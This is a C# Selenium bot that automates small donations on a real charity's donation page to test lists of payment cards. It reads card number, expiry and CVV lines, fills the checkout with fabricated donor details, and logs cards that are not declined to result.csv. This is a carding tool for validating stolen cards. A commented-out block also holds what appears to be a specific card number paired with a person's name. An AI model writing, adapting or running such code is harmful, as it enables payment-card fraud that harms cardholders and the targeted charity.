using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System.Threading.Tasks;
using System.IO;
using Newtonsoft.Json.Linq;
using System.Web;

namespace BetBasketBallChecker
{
    class CompareDonatetwr : CompareClass
    {
        protected List<string> m_mailList = new List<string>() { };
        protected List<string> m_cardList = new List<string>() { };
        int tv = new Random().Next(0, 1000);
        int m_mainIndex = 0;
        int c_Index = -1;
        bool is_find = false;
        public CompareDonatetwr(Form1 wnd) : base(wnd)
        {
            load = new WebDriverWait(driver, TimeSpan.FromSeconds(100));

        }

        protected override void addCart(String cartUrl)
        {
            try
            {
                driver.Manage().Cookies.DeleteAllCookies();
                driver.Navigate().GoToUrl("https://donate.twr.org/p-241-twr360.aspx");
                Thread.Sleep(3000);

                driver.FindElementsByName("donationAmount")[4].Click();

                inputTexttoElement("//input[@name='txtDonationAmount']", "1");
                driver.FindElementByXPath("//a[text()='Donate']").Click();

            }
            catch (Exception ex)
            {
                log("error", ex.Message);
            }
        }
     
        protected override void startCompare(String cartUrl,string data)
        {
            using (StringReader sr = new StringReader(data))
            {
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    m_cardList.Add(line);
                }
            }
            if (!is_find)
            {
                while (true)
                {
                    try
                    {
                        addCart(cartUrl);
                        driver.FindElementByLinkText("Continue Checkout").Click();
                        break;
                    }
                    catch (Exception ex)
                    {
                    }
                }
                Thread.Sleep(2000);
            }
            for (int i = 0; i < m_cardList.Count; i++)
            {
                if (is_find)
                {
                    while (true)
                    {
                        try
                        {
                            addCart(cartUrl);
                            driver.FindElementByLinkText("Continue Checkout").Click();
                            is_find = false;
                            break;
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                    Thread.Sleep(2000);
                }
                userDetails();
                cardCheckOutDetails(m_cardList[i]);
            }
        }

        protected void userDetails()
        {
            //while (true)
            //{
            try
            {
                //Thread.Sleep(1000);
                string email = "test" + tv + "@test" + tv + ".com";
                inputTexttoElement("//input[@name='ctl00$PageContent$txtEmailAddress']", email);
                string name = "test" + tv;
                inputTexttoElement("//input[@name='ctl00$PageContent$_txtFirstName']", name);
                inputTexttoElement("//input[@name='ctl00$PageContent$_txtLastName']", "testlast1");
                inputTexttoElement("//input[@name='ctl00$PageContent$txtAddress1']", "L Mansora st.");
                inputTexttoElement("//input[@name='ctl00$PageContent$txtCity']", "telaviv");
                inputTexttoElement("//input[@name='ctl00$PageContent$txtZip']", "00972");
                tv++;
                SelectElement drpCountry = new SelectElement(driver.FindElementByName("ctl00$PageContent$ddlCountry"));
                drpCountry.SelectByText("Israel");
                driver.FindElementByClassName("button3L").Click();

            }
            catch (Exception ex)
            {
            }
            //}
        }//end of userDetails

        protected void cardCheckOutDetails(string newcardList)
        {

            while (true)
            {
                try
                {
                    string[] cardList = newcardList.Split(' ');
                    string cardnum = cardList[0];
                    string codeCode = cardList[2];
                    string cardMonth = cardList[1].Split('/')[0];
                    string cardYear = "20" + cardList[1].Split('/')[1];

                    //if (cardnum== "4101620789783664")
                    //{
                    //    inputTexttoElement("//input[@data-payment-fieldtype='name']", "Ahmed Salem");
                    //}
                    //else
                    //{
                    //    inputTexttoElement("//input[@data-payment-fieldtype='name']", "test1 testlast1");
                    //    //test1 testlast1
                    //}
                    inputTexttoElement("//input[@data-card-types]", cardnum);
                    inputTexttoElement("//input[@data-payment-fieldtype='verification']", codeCode);
                    SelectElement drpMonth = new SelectElement(driver.FindElementByName("ctl00$PageContent$CheckoutControl$paymentInfo$ctrlCreditCardPanel$ddlCCExpMonth"));
                    drpMonth.SelectByText(cardMonth);
                    SelectElement drpYear = new SelectElement(driver.FindElementByName("ctl00$PageContent$CheckoutControl$paymentInfo$ctrlCreditCardPanel$ddlCCExpYr"));
                    drpYear.SelectByText(cardYear);
                    driver.FindElementById("ctl00_PageContent_LinkButton1").Click();
                    Thread.Sleep(4000);

                    String yoururl = driver.Url;
                    Uri theUri = new Uri(yoururl);
                    String cardStatus = HttpUtility.ParseQueryString(theUri.Query).Get("errormsg");
                    log("error Url=", cardStatus);

                    if (cardStatus == null || (cardStatus.ToLower() != "DECLINED".ToLower() && cardStatus.ToLower() != "EXCEPTION".ToLower()))
                    {
                        is_find = true;
                        using (FileStream fs = new FileStream("result.csv", FileMode.Append, FileAccess.Write))
                        {
                            using (StreamWriter sw = new StreamWriter(fs))
                            {
                                sw.WriteLine(newcardList);
                                sw.Dispose();
                            }
                        }
                    }

                    break;

                }
                catch (Exception ex)
                {
                }
            }
        }//end of cardCheckOutDetails
    }
}
